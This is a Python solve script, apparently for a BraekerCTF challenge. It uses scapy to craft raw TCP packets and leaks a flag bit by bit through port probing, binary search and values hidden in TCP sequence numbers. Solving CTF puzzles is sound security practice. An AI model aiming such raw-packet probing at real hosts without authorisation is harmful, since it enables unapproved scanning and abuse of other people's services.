from Crypto.Util.number import long_to_bytes
from scapy.all import *

DEBUG = False
LOCAL = True

target = "braekerctf.butsers.nl" if not LOCAL else "172.18.112.1"

verbose = False if not DEBUG else True


def synchronize(port, tcount=0, max_try=3):
    if tcount >= max_try:
        print("Max try reached") if DEBUG else None
        return None

    ip = IP(dst=target)
    syn = TCP(dport=port, flags="S")
    synack = sr1(ip / syn, timeout=1, verbose=verbose)
    if not synack:
        print("Failed to synchronize with the server") if DEBUG else None
        return synchronize(port, tcount + 1, max_try)
    return synack if synack[TCP].seq == 1337 else synchronize(port, tcount + 1, max_try)


def guess(synack, g, tcount=0, max_try=3):
    if tcount >= max_try:
        print("Max try reached") if DEBUG else None
        return None

    sock = conf.L3socket()
    ip = IP(dst=target)
    psh = TCP(
        sport=synack.dport,
        dport=synack.sport,
        flags="PA",
        seq=synack.ack,
        ack=synack.seq + 1,
    )
    request = f"GET /guess?guess={g} HTTP/1.0\r\n\r\n"
    pshack = sock.sr1(ip / psh / request, timeout=1, verbose=verbose)
    if not pshack:
        print("Failed to guess the number") if DEBUG else None
        return guess(synack, g, tcount + 1, max_try)
    pshack.show() if DEBUG else None

    res = None

    def handle(pkt):
        nonlocal res
        res = pkt[TCP].seq - 7331

    sock.sniff(count=1, prn=handle, verbose=verbose)
    if res not in [0, 1, 2, 3]:
        print("Invalid response") if DEBUG else None
        return guess(synack, g, tcount + 1, max_try)
    return res


def attack(port):
    l, r = port, port + 1000

    # get flag len (search range)
    while True:
        print(f"Searching length flag range: {l - 1000} ~ {r - 1000}")
        synack = synchronize(r)
        if synack == None:
            break
        l, r = r, r + 1000

    # get flag len (binary search)
    while l < r:
        m = (l + r) // 2
        synack = synchronize(m)
        if synack == None:
            r = m
        else:
            l = m + 1

    len_flag = l - 1000
    print(f"Flag length: {len_flag}")

    arr_flag = [-1] * len_flag
    used_secret = set()
    for i in range(1000, 1000 + len_flag):
        synack = synchronize(i)
        l, r = 0, len_flag - 1

        # binary search
        get = False
        while l < r:
            m = (l + r) // 2
            plus = True
            # avoid duplicate secret, because secret is unique and used in offset bit of flag
            while m in used_secret:
                if plus:
                    m += 1
                    if m > r:
                        m = (l + r) // 2
                        plus = False
                else:
                    m -= 1
                    assert m >= l, "got m < l, idk how"

            print(f"Searching secret in {i - 1000}: {l} ~ {r} -> m: {m}", end=" ")
            res = guess(synack, m)
            print(f"res: {res}")
            assert res != None, "got None in res"
            if res == 0:
                l = m + 1
            elif res == 1:
                r = m - 1
            else:
                arr_flag[m] = res - 2
                get = True
                used_secret.add(m)
                break
        if not get:
            res = guess(synack, l)
            arr_flag[l] = res - 2
            used_secret.add(l)

    print(arr_flag)
    assert -1 not in arr_flag, "got -1 in arr_flag"
    long_flag = 0
    for i, v in enumerate(arr_flag):
        long_flag |= v << (len_flag - i - 1)

    print(long_to_bytes(long_flag))


attack(1000)
